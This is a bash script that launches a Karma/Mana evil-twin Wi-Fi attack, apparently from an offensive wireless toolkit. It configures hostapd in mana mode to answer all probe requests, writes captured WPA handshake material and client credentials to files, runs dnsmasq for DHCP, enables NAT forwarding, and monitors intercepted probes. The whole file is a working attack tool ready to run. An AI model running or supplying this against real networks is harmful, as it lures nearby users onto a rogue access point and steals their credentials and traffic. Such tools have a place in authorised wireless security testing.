#!/usr/bin/env bash
# Karma/Mana evil twin for open networks
# Usage: karma_attack.sh <interface>

set -euo pipefail

_log()   { echo "$*" >&2; }
_json()  { printf '%s\n' "$*"; }
_die()   { _json "{\"status\":\"error\",\"message\":\"$1\"}"; exit 1; }

cleanup() {
    _log "[*] Cleaning up Karma attack..."
    if [[ -n "${HOSTAPD_PID:-}" ]]; then
        kill "$HOSTAPD_PID" 2>/dev/null || true
    fi
    if [[ -n "${DNSMASQ_PID:-}" ]]; then
        kill "$DNSMASQ_PID" 2>/dev/null || true
    fi
    if [[ -n "${AIROPCAP_PID:-}" ]]; then
        kill "$AIROPCAP_PID" 2>/dev/null || true
    fi
    # Flush iptables
    iptables -t nat -D POSTROUTING -o "${IFACE:-}" -j MASQUERADE 2>/dev/null || true
    sysctl -w net.ipv4.ip_forward=0 2>/dev/null || true
    rm -rf "${TMPDIR_WORK:-}" 2>/dev/null || true
    exit "${EXIT_RC:-0}"
}
trap cleanup EXIT

# ── Root check ────────────────────────────────────────────────────────
if [[ $EUID -ne 0 ]]; then
    _die "Root privileges required"
fi

# ── Dependency check ──────────────────────────────────────────────────
for cmd in hostapd dnsmasq; do
    if ! command -v "$cmd" &>/dev/null; then
        _die "$cmd not found"
    fi
done

# ── Args ──────────────────────────────────────────────────────────────
IFACE="${1:-}"

if [[ -z "$IFACE" ]]; then
    _die "Usage: karma_attack.sh <interface>"
fi

if [[ ! -d "/sys/class/net/$IFACE" ]]; then
    _die "Interface '$IFACE' does not exist"
fi

# ── Setup ─────────────────────────────────────────────────────────────
TMPDIR_WORK=$(mktemp -d /tmp/wafford_karma.XXXXXX)
HOSTAPD_CONF="${TMPDIR_WORK}/hostapd-karma.conf"
DNSMASQ_CONF="${TMPDIR_WORK}/dnsmasq.conf"
LOGFILE="${TMPDIR_WORK}/hostapd.log"

AP_IP="10.0.0.1"

# ── Configure interface ───────────────────────────────────────────────
_log "[*] Configuring interface $IFACE..."
ip link set "$IFACE" down 2>/dev/null || true
ip addr flush dev "$IFACE" 2>/dev/null || true
ip addr add "${AP_IP}/24" dev "$IFACE" 2>/dev/null || true
ip link set "$IFACE" up 2>/dev/null || true

# ── Enable IP forwarding ──────────────────────────────────────────────
sysctl -w net.ipv4.ip_forward=1 2>/dev/null || true
iptables -t nat -A POSTROUTING -o "$IFACE" -j MASQUERADE 2>/dev/null || true

# ── Generate hostapd.conf in Karma/Mana mode ─────────────────────────
# Mana mode: respond to all probe requests (karma behavior)
cat > "$HOSTAPD_CONF" <<EOF
interface=$IFACE
driver=nl80211
ssid=KarmaNetwork
hw_mode=g
channel=6
ieee80211n=1
wmm_enabled=1
# Mana/karma options
mana_wpaout=${TMPDIR_WORK}/karma_pmkid.raw
mana_loud=1
mana_credout=${TMPDIR_WORK}/karma_creds.csv
mana_credinterval=30
EOF

_log "[*] Generated Karma hostapd.conf"

# ── Generate dnsmasq.conf ─────────────────────────────────────────────
cat > "$DNSMASQ_CONF" <<EOF
interface=$IFACE
bind-interfaces
dhcp-range=10.0.0.2,10.0.0.254,255.255.255.0,12h
dhcp-option=option:router,$AP_IP
dhcp-option=option:dns-server,8.8.8.8
log-dhcp
log-queries
EOF

# ── Start dnsmasq ─────────────────────────────────────────────────────
_log "[*] Starting dnsmasq..."
dnsmasq -C "$DNSMASQ_CONF" --no-daemon > "${TMPDIR_WORK}/dnsmasq.log" 2>&1 &
DNSMASQ_PID=$!
sleep 1

# ── Start hostapd (mana mode) ────────────────────────────────────────
_log "[*] Starting hostapd in Mana/Karma mode..."
hostapd -B "$HOSTAPD_CONF" >> "$LOGFILE" 2>&1 || true
sleep 2

HOSTAPD_PID=$(pgrep -f "hostapd.*${HOSTAPD_CONF}" | head -1 || echo "")
if [[ -z "$HOSTAPD_PID" ]]; then
    HOSTAPD_PID=$(pgrep -x hostapd | head -1 || echo "")
fi

if [[ -n "$HOSTAPD_PID" ]]; then
    _log "[+] hostapd started (PID: $HOSTAPD_PID)"
else
    _die "Failed to start hostapd"
fi

# ── Monitor probe requests ───────────────────────────────────────────
_log "[*] Karma attack active. Monitoring probe requests..."

(
    PROBES=0
    while true; do
        # Count mana credential captures
        if [[ -f "${TMPDIR_WORK}/karma_creds.csv" ]]; then
            PROBES=$(wc -l < "${TMPDIR_WORK}/karma_creds.csv" 2>/dev/null || echo "0")
        fi
        # Count probe responses from hostapd log
        if [[ -f "$LOGFILE" ]]; then
            LOCAL_PROBES=$(grep -c "probing" "$LOGFILE" 2>/dev/null || echo "0")
            PROBES=$(( LOCAL_PROBES ))
        fi
        echo "{\"event\":\"monitor\",\"probes_intercepted\":${PROBES},\"status\":\"running\"}" >&2
        sleep 5
    done
) &
MONITOR_PID=$!

# ── Output ────────────────────────────────────────────────────────────
_json "{\"status\":\"success\",\"action\":\"started\",\"interface\":\"${IFACE}\",\"ssid\":\"KarmaNetwork\",\"hostapd_pid\":${HOSTAPD_PID},\"dnsmasq_pid\":${DNSMASQ_PID},\"probes_intercepted\":0,\"capture_dir\":\"${TMPDIR_WORK}\"}"

wait "$HOSTAPD_PID" 2>/dev/null || true
